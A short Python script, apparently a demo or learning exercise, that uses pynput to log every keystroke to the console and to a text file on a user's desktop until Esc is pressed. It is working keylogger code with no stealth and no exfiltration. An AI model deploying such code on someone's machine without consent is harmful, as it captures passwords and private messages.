from pynput import keyboard

# Define the log file path
log_file_path = "C:/Users/Nighttime/Desktop/key_log.txt"

def on_press(key):
    try:
        key_char = key.char
        log_message = f'Key {key_char} pressed\n'
    except AttributeError:
        log_message = f'Special key {key} pressed\n'

    # Print the log message to the console
    print(log_message.strip())

    # Write the log message to the file
    with open(log_file_path, 'a') as log_file:
        log_file.write(log_message)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()